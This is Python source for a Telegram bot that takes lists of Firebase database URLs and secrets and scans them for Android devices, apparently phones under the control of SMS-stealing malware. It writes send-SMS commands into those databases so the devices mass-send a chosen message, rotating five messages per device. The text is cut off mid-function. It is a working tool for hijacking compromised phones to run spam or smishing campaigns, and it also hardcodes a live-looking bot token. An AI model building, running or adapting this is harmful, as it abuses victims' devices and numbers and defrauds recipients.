#!/usr/bin/env python3
"""
spinach Multi-User Automatic SMS Bot
- Reply keyboard menu: Add Firebase / Recipients / Custom SMS / Start / Stop / How to use
- Per-user persistence (SQLite): firebase URLs, recipients, custom SMS
- Distribution: 5 SMS from device A, then switch to device B for next 5, etc.
- Firebase input: URL list (txt). Optional URL|SECRET
"""

import os
import re
import json
import time
import uuid
import sqlite3
import threading
import logging
from typing import Any, Optional
from collections import defaultdict
from dataclasses import dataclass, field
from urllib.parse import quote

import telebot
from telebot import types
import requests

# ── CONFIG ────────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8763280422:AAFwSQvwIgSrgqBsGJTZmjGFe0kKlvHVD_o")
ALLOWED_USERS: set[int] = set()  # empty = everyone
SMS_PER_DEVICE = 5
ONLINE_WINDOW_MS = 15 * 60 * 1000
JOB_DELAY_SEC = 3.5
SAME_DEVICE_EXTRA_DELAY = 2.0
PROGRESS_EDIT_EVERY = 2
HTTP_TIMEOUT = 25
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_FILE = os.path.join(BASE_DIR, "bot_data.db")

# ── LOGGING ───────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger("multi-sms-bot")

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ── KEYBOARD LABELS ───────────────────────────────────────────────────────
BTN_ADD_FB = "🔥 Add Firebase"
BTN_RECIPIENTS = "👥 Recipient Numbers"
BTN_SMS = "💬 Custom SMS"
BTN_START = "▶️ Start SMS"
BTN_STOP = "⏹ Stop SMS"
BTN_STATUS = "📊 Status"
BTN_HELP = "❓ How to use"
BTN_CLEAR = "🗑 Clear Saved"
BTN_USEALL = "📱 Use All Devices"
BTN_RESCAN = "🔄 Rescan Devices"

MENU_BUTTONS = {
    BTN_ADD_FB, BTN_RECIPIENTS, BTN_SMS, BTN_START, BTN_STOP,
    BTN_STATUS, BTN_HELP, BTN_CLEAR, BTN_USEALL, BTN_RESCAN,
}

def main_keyboard() -> types.ReplyKeyboardMarkup:
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(types.KeyboardButton(BTN_ADD_FB), types.KeyboardButton(BTN_RECIPIENTS))
    kb.add(types.KeyboardButton(BTN_SMS), types.KeyboardButton(BTN_STATUS))
    kb.add(types.KeyboardButton(BTN_START), types.KeyboardButton(BTN_STOP))
    kb.add(types.KeyboardButton(BTN_USEALL), types.KeyboardButton(BTN_RESCAN))
    kb.add(types.KeyboardButton(BTN_HELP), types.KeyboardButton(BTN_CLEAR))
    return kb

# ── SQLITE PERSISTENCE (multi-user) ───────────────────────────────────────
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id     TEXT PRIMARY KEY,
            data        TEXT NOT NULL,
            updated_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cur.execute("PRAGMA journal_mode=WAL")
    conn.commit()
    conn.close()

def _default_user_data() -> dict:
    return {
        "firebase_urls": [],   # list of {"url": str, "secret": str}
        "numbers": [],
        "message": "",
        "use_all_devices": False,
    }

def load_user_data(user_id: int) -> dict:
    uid = str(user_id)
    try:
        conn = sqlite3.connect(DB_FILE, timeout=10)
        cur = conn.cursor()
        cur.execute("SELECT data FROM users WHERE user_id=?", (uid,))
        row = cur.fetchone()
        conn.close()
        if row:
            d = json.loads(row[0])
            base = _default_user_data()
            base.update(d)
            return base
    except Exception as e:
        log.warning("load_user_data: %s", e)
    return _default_user_data()

def save_user_data(user_id: int, data: dict):
    uid = str(user_id)
    try:
        conn = sqlite3.connect(DB_FILE, timeout=10)
        cur = conn.cursor()
        cur.execute(
            "INSERT OR REPLACE INTO users (user_id, data, updated_at) VALUES (?, ?, CURRENT_TIMESTAMP)",
            (uid, json.dumps(data, ensure_ascii=False)),
        )
        conn.commit()
        conn.close()
    except Exception as e:
        log.error("save_user_data: %s", e)

# ── SESSION (runtime, per chat) ───────────────────────────────────────────
@dataclass
class FirebaseProject:
    name: str
    db_url: str
    secret: str = ""
    devices: list = field(default_factory=list)

@dataclass
class Session:
    chat_id: int
    user_id: int = 0
    step: str = "idle"  # idle | await_firebase | await_numbers | await_message | running
    projects: list = field(default_factory=list)
    online_devices: list = field(default_factory=list)  # ordered list used for batching
    numbers: list = field(default_factory=list)
    message: str = ""
    sent: int = 0
    failed: int = 0
    total: int = 0
    progress_msg_id: Optional[int] = None
    cancel: bool = False
    lock: threading.Lock = field(default_factory=threading.Lock)

sessions: dict[int, Session] = {}
sessions_lock = threading.Lock()

def get_session(chat_id: int, user_id: int = 0) -> Session:
    with sessions_lock:
        if chat_id not in sessions:
            sessions[chat_id] = Session(chat_id=chat_id, user_id=user_id or chat_id)
        s = sessions[chat_id]
        if user_id:
            s.user_id = user_id
        return s

def is_allowed(uid: int) -> bool:
    if not ALLOWED_USERS:
        return True
    return uid in ALLOWED_USERS

# ── FIREBASE REST ─────────────────────────────────────────────────────────
def norm_url(raw: str) -> str:
    u = (raw or "").strip()
    if not u:
        return ""
    if not re.match(r"^https?://", u, re.I):
        u = "https://" + u
    return u.rstrip("/")

def fb_url(base: str, path: str = "", secret: str = "") -> str:
    base = norm_url(base)
    path = (path or "").strip().strip("/")
    if path:
        if path.endswith(".json"):
            ep = f"{base}/{path}"
        else:
            ep = f"{base}/{path}.json"
    else:
        ep = f"{base}/.json"
    if secret:
        ep += f"?auth={quote(secret, safe='')}"
    return ep

def fb_get(base: str, path: str = "", secret: str = "") -> Any:
    url = fb_url(base, path, secret)
    r = requests.get(url, timeout=HTTP_TIMEOUT)
    if r.status_code in (401, 403):
        raise RuntimeError(
            f"Auth failed ({r.status_code}). Use URL|DATABASE_SECRET"
        )
    if r.status_code == 404:
        raise RuntimeError(f"Not found (404): {base}")
    if r.status_code == 423:
        raise RuntimeError("DB locked (423). Project suspended or over quota.")
    if r.status_code == 429:
        raise RuntimeError("Rate limited (429).")
    if not r.ok:
        raise RuntimeError(f"HTTP {r.status_code}: {r.text[:200]}")
    if not r.text or r.text == "null":
        return None
    return r.json()

def fb_put(base: str, path: str, data: dict, secret: str = "") -> None:
    url = fb_url(base, path, secret)
    r = requests.put(url, json=data, timeout=HTTP_TIMEOUT)
    if r.status_code in (401, 403):
        raise RuntimeError(f"Auth failed ({r.status_code}) on write")
    if not r.ok:
        raise RuntimeError(f"Write HTTP {r.status_code}: {r.text[:200]}")

# ── ONLINE / SCAN ─────────────────────────────────────────────────────────
def parse_timestamp(val) -> Optional[int]:
    if val is None:
        return None
    try:
        if isinstance(val, (int, float)):
            t = int(val)
            if t < 1_000_000_000_000:
                t *= 1000
            return t
        if isinstance(val, str):
            s = val.strip()
            if s.isdigit():
                t = int(s)
                if t < 1_000_000_000_000:
                    t *= 1000
                return t
    except Exception:
        pass
    return None

def is_device_online(node: dict) -> tuple:
    if not isinstance(node, dict):
        return False, None
    now_ms = int(time.time() * 1000)
    info = node.get("info") if isinstance(node.get("info"), dict) else {}
    st_obj = node.get("status") if isinstance(node.get("status"), dict) else {}
    if not st_obj and isinstance(info.get("status"), dict):
        st_obj = info["status"]

    ts_keys = (
        "lastOnlineAt", "last_seen", "lastSeen", "lastSeenAt",
        "lastOnline", "last_online", "lastActive", "last_active",
        "updatedAt", "updated_at", "last_update", "lastUpdate",
        "timestamp", "ts", "time", "dateTime", "lastMessageTime",
        "last_heartbeat", "lastHeartbeat", "joined",
    )
    last_seen = None
    for src in (node, info, st_obj):
        if not isinstance(src, dict):
            continue
        for k in ts_keys:
            t = parse_timestamp(src.get(k))
            if t is not None and (last_seen is None or t > last_seen):
                last_seen = t

    hb = node.get("heartbeat")
    if isinstance(hb, dict):
        for k in ("timestamp", "ts", "time", "lastSeen", "updatedAt"):
            t = parse_timestamp(hb.get(k))
            if t is not None and (last_seen is None or t > last_seen):
                last_seen = t
    else:
        t = parse_timestamp(hb)
        if t is not None and (last_seen is None or t > last_seen):
            last_seen = t

    for src in (node, info, st_obj):
        if not isinstance(src, dict):
            continue
        if src.get("isOnline") or src.get("online") or src.get("connected") or src.get("alive"):
            return True, last_seen

    raw = None
    if not isinstance(node.get("status"), dict):
        raw = node.get("status")
    if raw is None and not isinstance(info.get("status"), dict):
        raw = info.get("status")
    if raw is None and isinstance(st_obj, dict):
        raw = st_obj.get("status")
    if raw is None:
        raw = node.get("state") or info.get("state")

    if raw is True or raw == 1:
        return True, last_seen
    if isinstance(raw, str):
        sl = raw.lower().strip()
        if sl in ("online", "active", "alive", "on", "true", "1", "connected"):
            return True, last_seen
        if sl and sl not in ("false", "0", "no", "offline", "inactive", "disconnected", "dead", "gone"):
            return True, last_seen
    if isinstance(raw, (int, float)) and raw != 0:
        return True, last_seen
    if isinstance(raw, dict):
        if raw.get("online") or raw.get("isOnline") or raw.get("connected") or raw.get("active") or raw.get("alive"):
            return True, last_seen

    if isinstance(hb, dict):
        hb_st = str(hb.get("status") or "").lower()
        if hb_st in ("alive", "online", "active"):
            return True, last_seen

    if last_seen is not None:
        delta = now_ms - last_seen
        if -60_000 < delta < ONLINE_WINDOW_MS:
            return True, last_seen
    return False, last_seen

def extract_phone(node: dict) -> str:
    info = node.get("info") if isinstance(node.get("info"), dict) else {}
    for c in (
        node.get("mobNo"), info.get("mobNo"), node.get("phone"), node.get("phoneNumber"),
        node.get("phone_number"), info.get("phone"), info.get("phoneNumber"),
        node.get("mobile"), node.get("number"), node.get("msisdn"), info.get("msisdn"),
    ):
        if c is None:
            continue
        dig = re.sub(r"[^\d+]", "", str(c))
        if len(dig) >= 10:
            return dig
    sims = node.get("sims") or info.get("sims") or node.get("simInfo") or []
    if isinstance(sims, list):
        for s in sims:
            if isinstance(s, dict):
                p = s.get("phoneNumber") or s.get("number") or s.get("msisdn")
                if p and str(p) != "Unknown":
                    dig = re.sub(r"[^\d+]", "", str(p))
                    if len(dig) >= 10:
                        return dig
    return "—"

def project_label(db_url: str) -> str:
    u = norm_url(db_url)
    m = re.search(r"https?://([^.]+)", u, re.I)
    return m.group(1) if m else u[:40]

def _merge_device_maps(*maps) -> dict:
    merged = {}
    for blob in maps:
        if not isinstance(blob, dict):
            continue
        for did, data in blob.items():
            if data is None or not isinstance(data, dict):
                continue
            did_s = str(did)
            if did_s.startswith(".") or did_s in ("webhookEvent", "actions", "config"):
                continue
            if did_s in merged:
                base = dict(merged[did_s])
                base.update({k: v for k, v in data.items() if v is not None})
                merged[did_s] = base
            else:
                merged[did_s] = data
    return merged

def scan_devices(db_url: str, secret: str = "") -> list:
    out = []
    clients = devices = None
    try:
        try:
            clients = fb_get(db_url, "clients", secret)
        except Exception as e:
            log.info("clients miss %s: %s", db_url, e)
        try:
            devices = fb_get(db_url, "devices", secret)
        except Exception as e:
            log.info("devices miss %s: %s", db_url, e)
        if clients is None and devices is None:
            devices = fb_get(db_url, "devices", secret)
        merged = _merge_device_maps(
            clients if isinstance(clients, dict) else {},
            devices if isinstance(devices, dict) else {},
        )
        for did, node in merged.items():
            online, last_seen = is_device_online(node)
            phone = extract_phone(node)
            out.append({
                "id": str(did),
                "online": online,
                "lastSeen": last_seen,
                "phone": phone,
            })
        log.info("scan %s total=%d online=%d", project_label(db_url), len(out), sum(1 for d in out if d["online"]))
    except Exception as e:
        log.warning("scan fail %s: %s", db_url, e)
        raise
    return out

def push_sms_job(db_url: str, secret: str, device_id: str, to: str, body: str, chat_id: int) -> str:
    job_id = str(uuid.uuid4())[:12]
    now_ms = int(time.time() * 1000)
    to_n = to.strip()
    msg = body.strip()

    payload_simple = {
        "from": 0,
        "to": to_n,
        "message": msg,
        "isSended": False,
        "ts": now_ms,
        "jobId": job_id,
    }
    payload_cmd = {
        "cmdId": now_ms,
        "from": 0,
        "to": to_n,
        "message": msg,
        "isSended": False,
        "sendOk": False,
        "jobId": job_id,
    }
    payload_nexus = {
        "to": to_n,
        "body": msg,
        "message": msg,
        "status": "pending",
        "createdAt": now_ms,
        "requestedBy": chat_id,
        "sim": 1,
        "from": 0,
        "isSended": False,
        "jobId": job_id,
    }

    fixed_paths = [
        f"clients/{device_id}/webhookEvent/sendSms",
        f"devices/{device_id}/webhookEvent/sendSms",
    ]
    wait_deadline = time.time() + 12.0
    while time.time() < wait_deadline:
        busy = False
        for p in fixed_paths:
            try:
                cur = fb_get(db_url, p, secret)
            except Exception:
                continue
            if not isinstance(cur, dict):
                continue
            if cur.get("isSended") is False and cur.get("to"):
                if str(cur.get("to")).strip() == to_n:
                    continue
                busy = True
                break
        if not busy:
            break
        time.sleep(0.6)

    primary = [
        (f"clients/{device_id}/webhookEvent/sendSms.json", payload_simple),
        (f"devices/{device_id}/webhookEvent/sendSms.json", payload_simple),
        (f"devices/{device_id}/actions/sendSms.json", payload_cmd),
        (f"clients/{device_id}/actions/sendSms.json", payload_cmd),
    ]
    unique = [
        (f"devices/{device_id}/sendSms/{job_id}", payload_nexus),
        (f"clients/{device_id}/sendSms/{job_id}", payload_nexus),
    ]

    wrote = []
    last_err = None
    for path, payload in primary:
        try:
            fb_put(db_url, path, payload, secret)
            wrote.append(path)
        except Exception as e:
            last_err = e
    for path, payload in unique:
        try:
            fb_put(db_url, path, payload, secret)
            wrote.append(path)
        except Exception as e:
            last_err = e
    if not wrote:
        raise RuntimeError(f"all send paths failed: {last_err}")
    return job_id

# ── PARSE ─────────────────────────────────────────────────────────────────
def parse_firebase_urls(text: str) -> list:
    results = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        secret = ""
        url = line
        if "|" in line:
            a, b = line.split("|", 1)
            url, secret = a.strip(), b.strip()
        else:
            m = re.match(r"^(https?://\S+)\s+(\S+)$", line, re.I)
            if m:
                url, secret = m.group(1), m.group(2)
        url = norm_url(url)
        if not re.search(r"firebaseio\.com|firebasedatabase\.app", url, re.I):
            continue
        key = url.lower()
        if key in seen:
            continue
        seen.add(key)
        results.append((url, secret))
    return results

def parse_numbers(text: str) -> list:
    """Keep numbers exactly as provided — no +91 auto-prefix."""
    nums = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        for tok in re.split(r"[\s,;|]+", line):
            dig = re.sub(r"[^\d+]", "", tok)
            if len(dig) < 8:
                continue
            if dig not in seen:
                seen.add(dig)
                nums.append(dig)
    return nums

# ── PROGRESS ──────────────────────────────────────────────────────────────
def progress_bar(done: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * done / total))
    return "█" * filled + "░" * (width - filled)

def format_progress(s: Session) -> str:
    left = max(0, s.total - s.sent - s.failed)
    pct = int(100 * (s.sent + s.failed) / s.total) if s.total else 0
    bar = progress_bar(s.sent + s.failed, s.total)
    status = "RUNNING" if s.step == "running" else ("DONE" if s.step == "done" else s.step.upper())
    return (
        f"<b>SMS Campaign — {status}</b>\n\n"
        f"<code>[{bar}]</code> {pct}%\n\n"
        f"✅ Queued: <b>{s.sent}</b>\n"
        f"❌ Failed: <b>{s.failed}</b>\n"
        f"⏳ Left: <b>{left}</b>\n"
        f"📦 Total: <b>{s.total}</b>\n"
        f"📱 Devices in use: <b>{len(s.online_devices)}</b>\n"
        f"🔁 Rule: <b>{SMS_PER_DEVICE}</b> SMS / device then switch"
    )

# ── BUILD DEVICE LIST + BATCH QUEUE (5 per device, then next) ─────────────
def build_device_list(s: Session, use_all: bool) -> list:
    """Stable ordered list of devices for batching."""
    out = []
    for pi, p in enumerate(s.projects):
        for d in p.devices:
            if use_all or d.get("online"):
                out.append({
                    "project_idx": pi,
                    "id": d["id"],
                    "phone": d.get("phone") or "—",
                    "project": p.name,
                })
    return out

def build_batch_queue(devices: list, numbers: list) -> list:
    """
    Assign numbers in blocks of SMS_PER_DEVICE per device:
      device0 → numbers[0:5]
      device1 → numbers[5:10]
      device2 → numbers[10:15]
      ...
    If numbers remain after all devices used once, wrap around devices again.
    """
    if not devices or not numbers:
        return []
    queue = []  # (device_meta, number)
    di = 0
    count_on_device = 0
    for num in numbers:
        if count_on_device >= SMS_PER_DEVICE:
            di = (di + 1) % len(devices)
            count_on_device = 0
        queue.append((devices[di], num))
        count_on_device += 1
    return queue

# ── SCAN ALL SAVED FIREBASE ───────────────────────────────────────────────
def scan_all_for_session(s: Session, user_data: dict) -> str:
    entries = user_data.get("firebase_urls") or []
    if not entries:
        return "No Firebase URLs saved. Tap <b>🔥 Add Firebase</b> first."

    projects = []
    errors = []
    for item in entries:
        url = item.get("url") if isinstance(item, dict) else str(item)
        secret = item.get("secret", "") if isinstance(item, dict) else ""
        url = norm_url(url)
        label = project_label(url)
        try:
            devices = scan_devices(url, secret)
        except Exception as e:
            errors.append(f"• <code>{label}</code>: {e}")
            continue
        projects.append(FirebaseProject(name=label, db_url=url, secret=secret, devices=devices))

    s.projects = projects
    use_all = bool(user_data.get("use_all_devices"))
    s.online_devices = build_device_list(s, use_all=use_all)

    lines = [f"<b>Scan complete</b> — {len(projects)} project(s)\n"]
    for p in projects:
        on = sum(1 for d in p.devices if d.get("online"))
        sec = "🔐" if p.secret else "🔓"
        lines.append(f"• {sec} <code>{p.name}</code> — {len(p.devices)} device(s), <b>{on} online</b>")
    if errors:
        lines.append("\n<b>Failed</b>")
        lines.extend(errors[:8])
    mode = "ALL devices" if use_all else "online only"
    lines.append(f"\n📱 Send pool ({mode}): <b>{len(s.online_devices)}</b>")
    if s.online_devices:
        for d in s.online_devices[:12]:
            lines.append(f"  └ {d['project']}/{d['id']} ({d['phone']})")
        if len(s.online_devices) > 12:
            lines.append(f"  … +{len(s.online_devices)-12} more")
    else:
        lines.append(
            "\n⚠️ No devices in pool.\n"
            "• Rescan after devices come online\n"
            "• Or tap <b>📱 Use All Devices</b>"
        )
    return "\n".join(lines)

# ── CAMPAIGN WORKER ───────────────────────────────────────────────────────
def run_campaign(chat_id: int):
    s = get_session(chat_id)
    if not s.online_devices or not s.numbers or not s.message:
        bot.send_message(chat_id, "Missing devices / numbers / message.", reply_markup=main_keyboard())
        s.step = "idle"
        return

    s.step = "running"
    s.sent = 0
    s.failed = 0
    s.total = len(s.numbers)
    s.cancel = False

    queue = build_batch_queue(s.online_devices, s.numbers)
    # Log batch plan
    plan = defaultdict(list)
    for dev, num in queue:
        plan[(dev["project"], dev["id"], dev.get("phone"))].append(num)
    log.info("batch plan devices=%d numbers=%d", len(plan), len(queue))
    for (proj, did, phone), nums in plan.items():
        log.info("  %s/%s (%s) → %d numbers", proj, did, phone, len(nums))

    try:
        msg = bot.send_message(chat_id, format_progress(s), reply_markup=main_keyboard())
        s.progress_msg_id = msg.message_id
    except Exception:
        s.progress_msg_id = None

    prev_key = None
    for idx, (dev, number) in enumerate(queue):
        if s.cancel:
            break
        proj = s.projects[dev["project_idx"]]
        key = (dev["project_idx"], dev["id"])
        try:
            jid = push_sms_job(proj.db_url, proj.secret, dev["id"], number, s.message, chat_id)
            with s.lock:
                s.sent += 1
            log.info("queued %s via %s/%s job=%s", number, proj.name, dev["id"], jid)
        except Exception as e:
            with s.lock:
                s.failed += 1
            log.warning("fail %s: %s", number, e)

        if s.progress_msg_id and ((idx + 1) % PROGRESS_EDIT_EVERY == 0 or idx == len(queue) - 1):
            try:
                bot.edit_message_text(format_progress(s), chat_id, s.progress_msg_id)
            except Exception:
                pass

        time.sleep(JOB_DELAY_SEC)
        if prev_key == key:
            time.sleep(SAME_DEVICE_EXTRA_DELAY)
        prev_key = key

    s.step = "done"
    try:
        if s.progress_msg_id:
            bot.edit_message_text(format_progress(s), chat_id, s.progress_msg_id)
        bot.send_message(
            chat_id,
            f"<b>Campaign finished</b>\n"
            f"✅ {s.sent} queued · ❌ {s.failed} failed · Total {s.total}\n"
            f"Rule: {SMS_PER_DEVICE} SMS per device then switch.\n"
            f"Use menu to run again.",
            reply_markup=main_keyboard(),
        )
    except Exception:
        pass
    s.step = "idle"

# ── HANDLERS ──────────────────────────────────────────────────────────────
HELP_TEXT = (
    "<b>How to use this bot</b>\n\n"
    "Multi-user: each Telegram account has its own saved Firebase list, "
    "recipients, and custom SMS.\n\n"
    f"1️⃣ <b>{BTN_ADD_FB}</b>\n"
    "   Send a .txt (or paste) with Firebase RTDB URLs, one per line.\n"
    "   Optional secret: <code>URL|DATABASE_SECRET</code>\n"
    "   Saved automatically. Bot scans clients/ + devices/.\n\n"
    f"2️⃣ <b>{BTN_RECIPIENTS}</b>\n"
    "   Send .txt or paste numbers (as-is, no +91 added). Saved.\n\n"
    f"3️⃣ <b>{BTN_SMS}</b>\n"
    "   Send the exact SMS text. Saved.\n\n"
    f"4️⃣ <b>{BTN_START}</b>\n"
    f"   Sends SMS: first {SMS_PER_DEVICE} recipients from device #1, "
    f"next {SMS_PER_DEVICE} from device #2, and so on.\n\n"
    f"5️⃣ <b>{BTN_STOP}</b> — cancel running campaign\n"
    f"6️⃣ <b>{BTN_STATUS}</b> — saved data + progress\n"
    f"7️⃣ <b>{BTN_USEALL}</b> — include offline device nodes in pool\n"
    f"8️⃣ <b>{BTN_RESCAN}</b> — rescan Firebase for online devices\n"
    f"9️⃣ <b>{BTN_CLEAR}</b> — wipe your saved data\n"
)

@bot.message_handler(commands=["start", "help", "menu"])
def cmd_start(message: types.Message):
    if not is_allowed(message.from_user.id):
        bot.reply_to(message, "Access denied.")
        return
    s = get_session(message.chat.id, message.from_user.id)
    s.step = "idle"
    s.cancel = False
    # hydrate from DB
    data = load_user_data(message.from_user.id)
    s.numbers = list(data.get("numbers") or [])
    s.message = data.get("message") or ""
    bot.reply_to(
        message,
        "<b>Multi-User Auto SMS Bot</b>\n\n"
        "Use the keyboard buttons below.\n"
        f"Rule: <b>{SMS_PER_DEVICE} SMS per device</b>, then next device.\n\n"
        + HELP_TEXT,
        reply_markup=main_keyboard(),
    )

@bot.message_handler(commands=["stop", "cancel"])
def cmd_stop(message: types.Message):
    if not is_allowed(message.from_user.id):
        return
    s = get_session(message.chat.id, message.from_user.id)
    s.cancel = True
    s.step = "idle"
    bot.reply_to(message, "Stop requested.", reply_markup=main_keyboard())

@bot.message_handler(content_types=["document"])
def on_document(message: types.Message):
    if not is_allowed(message.from_user.id):
        return
    s = get_session(message.chat.id, message.from_user.id)
    try:
        file_info = bot.get_file(message.document.file_id)
        raw = bot.download_file(file_info.file_path)
        text = raw.decode("utf-8", errors="ignore")
    except Exception as e:
        bot.reply_to(message, f"Download failed: {e}", reply_markup=main_keyboard())
        return

    if s.step == "await_firebase":
        _handle_firebase_text(message, s, text)
        return
    if s.step == "await_numbers":
        _handle_numbers_text(message, s, text)
        return

    # auto-detect
    if parse_firebase_urls(text):
        _handle_firebase_text(message, s, text)
        return
    if parse_numbers(text):
        _handle_numbers_text(message, s, text)
        return
    bot.reply_to(message, "Could not parse file. Use menu buttons.", reply_markup=main_keyboard())

def _handle_firebase_text(message: types.Message, s: Session, text: str):
    entries = parse_firebase_urls(text)
    if not entries:
        bot.reply_to(
            message,
            "No Firebase URLs found.\n"
            "Example:\n<code>https://proj-default-rtdb.firebaseio.com</code>\n"
            "<code>https://proj-default-rtdb.firebaseio.com|SECRET</code>",
            reply_markup=main_keyboard(),
        )
        return
    data = load_user_data(message.from_user.id)
    # merge unique
    existing = {(x.get("url") or "").lower(): x for x in (data.get("firebase_urls") or [])}
    for url, secret in entries:
        existing[url.lower()] = {"url": url, "secret": secret}
    data["firebase_urls"] = list(existing.values())
    save_user_data(message.from_user.id, data)
    s.step = "idle"
    bot.reply_to(
        message,
        f"Saved <b>{len(entries)}</b> URL(s). Total saved: <b>{len(data['firebase_urls'])}</b>.\nScanning…",
        reply_markup=main_keyboard(),
    )
    report = scan_all_for_session(s, data)
    bot.send_message(message.chat.id, report, reply_markup=main_keyboard())

def _handle_numbers_text(message: types.Message, s: Session, text: str):
    nums = parse_numbers(text)
    if not nums:
        bot.reply_to(message, "No numbers found.", reply_markup=main_keyboard())
        return
    data = load_user_data(message.from_user.id)
    data["numbers"] = nums
    save_user_data(message.from_user.id, data)
    s.numbers = nums
    s.step = "idle"
    bot.reply_to(
        message,
        f"Saved <b>{len(nums)}</b> recipient number(s).\n"
        f"Sample: <code>{nums[0]}</code>"
        + (f" … <code>{nums[-1]}</code>" if len(nums) > 1 else ""),
        reply_markup=main_keyboard(),
    )

@bot.message_handler(func=lambda m: True, content_types=["text"])
def on_text(message: types.Message):
    if not is_allowed(message.from_user.id):
        return
    text = (message.text or "").strip()
    if text.startswith("/"):
        return

    s = get_session(message.chat.id, message.from_user.id)
    uid = message.from_user.id

    # ── Menu buttons ──────────────────────────────────────────────────
    if text == BTN_HELP:
        bot.reply_to(message, HELP_TEXT, reply_markup=main_keyboard())
        return

    if text == BTN_ADD_FB:
        s.step = "await_firebase"
        bot.reply_to(
            message,
            "<b>Add Firebase</b>\n"
            "Send a .txt or paste URLs (one per line).\n"
            "Optional: <code>URL|DATABASE_SECRET</code>\n"
            "Your list is saved per account.",
            reply_markup=main_keyboard(),
        )
        return

    if text == BTN_RECIPIENTS:
        s.step = "await_numbers"
        bot.reply_to(
            message,
            "<b>Recipient Numbers</b>\n"
            "Send a .txt or paste numbers (one per line).\n"
            "Numbers are kept <b>exactly as typed</b> (no +91 added).\n"
            "Saved for your account.",
            reply_markup=main_keyboard(),
        )
        return

    if text == BTN_SMS:
        s.step = "await_message"
        data = load_user_data(uid)
        cur = data.get("message") or ""
        extra = f"\nCurrent: <code>{cur[:120]}{'…' if len(cur)>120 else ''}</code>" if cur else ""
        bot.reply_to(
            message,
            f"<b>Custom SMS</b>\nSend the exact message text (max 1000 chars).{extra}",
            reply_markup=main_keyboard(),
        )
        return

    if text == BTN_STATUS:
        data = load_user_data(uid)
        fb_n = len(data.get("firebase_urls") or [])
        num_n = len(data.get("numbers") or [])
        msg = data.get("message") or ""
        use_all = data.get("use_all_devices")
        body = (
            f"<b>Status</b>\n"
            f"Step: <code>{s.step}</code>\n"
            f"🔥 Firebase saved: <b>{fb_n}</b>\n"
            f"👥 Recipients: <b>{num_n}</b>\n"
            f"💬 SMS: <code>{(msg[:80] + '…') if len(msg)>80 else (msg or '—')}</code>\n"
            f"📱 Device pool: <b>{len(s.online_devices)}</b> ({'all' if use_all else 'online'})\n"
            f"🔥 Projects loaded: <b>{len(s.projects)}</b>\n"
        )
        if s.total:
            body += "\n" + format_progress(s)
        bot.reply_to(message, body, reply_markup=main_keyboard())
        return

    if text == BTN_STOP:
        s.cancel = True
        s.step = "idle"
        bot.reply_to(message, "Stop requested.", reply_markup=main_keyboard())
        return

    if text == BTN_CLEAR:
        save_user_data(uid, _default_user_data())
        s.projects = []
        s.online_devices = []
        s.numbers = []
        s.message = ""
        s.step = "idle"
        bot.reply_to(message, "Cleared your saved Firebase / numbers / SMS.", reply_markup=main_keyboard())
        return

    if text == BTN_USEALL:
        data = load_user_data(uid)
        data["use_all_devices"] = True
        save_user_data(uid, data)
        if s.projects:
            s.online_devices = build_device_list(s, use_all=True)
            bot.reply_to(
                message,
                f"Using <b>all</b> device nodes: <b>{len(s.online_devices)}</b> in pool.",
                reply_markup=main_keyboard(),
            )
        else:
            bot.reply_to(message, "Flag saved. Add/rescan Firebase to build pool.", reply_markup=main_keyboard())
        return

    if text == BTN_RESCAN:
        data = load_user_data(uid)
        if not data.get("firebase_urls"):
            bot.reply_to(message, "No Firebase saved. Tap 🔥 Add Firebase first.", reply_markup=main_keyboard())
            return
        bot.reply_to(message, "Rescanning…", reply_markup=main_keyboard())
        report = scan_all_for_session(s, data)
        bot.send_message(message.chat.id, report, reply_markup=main_keyboard())
        return

    if text == BTN_START:
        data = load_user_data(uid)
        # hydrate
        s.numbers = list(data.get("numbers") or s.numbers or [])
        s.message = (data.get("message") or s.message or "").strip()
        if not data.get("firebase_urls"):
            bot.reply_to(message, "No Firebase. Tap 🔥 Add Firebase.", reply_markup=main_keyboard())
            return
        if not s.numbers:
            bot.reply_to(message, "No recipients. Tap 👥 Recipient Numbers.", reply_markup=main_keyboard())
            return
        if not s.message:
            bot.reply_to(message, "No SMS text. Tap 💬 Custom SMS.", reply_markup=main_keyboard())
            return
        if s.step == "running":
            bot.reply_to(message, "Already running. Tap ⏹ Stop SMS first.", reply_markup=main_keyboard())
            return
        # ensure devices scanned
        if not s.projects:
            bot.reply_to(message, "Scanning Firebase…", reply_markup=main_keyboard())
            scan_all_for_session(s, data)
        if not s.online_devices:
            # try use_all automatically if nothing online
            s.online_devices = build_device_list(s, use_all=True)
        if not s.online_devices:
            bot.reply_to(
                message,
                "No devices found under clients/ or devices/.\n"
                "Check URLs / secrets, then 🔄 Rescan.",
                reply_markup=main_keyboard(),
            )
            return

        n_dev = len(s.online_devices)
        batches = (len(s.numbers) + SMS_PER_DEVICE - 1) // SMS_PER_DEVICE
        bot.reply_to(
            message,
            f"<b>Starting campaign</b>\n"
            f"👥 {len(s.numbers)} recipients\n"
            f"📱 {n_dev} devices\n"
            f"🔁 {SMS_PER_DEVICE} SMS per device then switch "
            f"(~{batches} device-batches)\n"
            f"💬 <code>{s.message[:100]}{'…' if len(s.message)>100 else ''}</code>",
            reply_markup=main_keyboard(),
        )
        t = threading.Thread(target=run_campaign, args=(message.chat.id,), daemon=True)
        t.start()
        return

    # ── Step inputs ───────────────────────────────────────────────────
    if s.step == "await_firebase":
        _handle_firebase_text(message, s, text)
        return

    if s.step == "await_numbers":
        _handle_numbers_text(message, s, text)
        return

    if s.step == "await_message":
        body = text.strip()
        if not body:
            bot.reply_to(message, "Empty message.", reply_markup=main_keyboard())
            return
        if len(body) > 1000:
            bot.reply_to(message, "Too long (max 1000).", reply_markup=main_keyboard())
            return
        data = load_user_data(uid)
        data["message"] = body
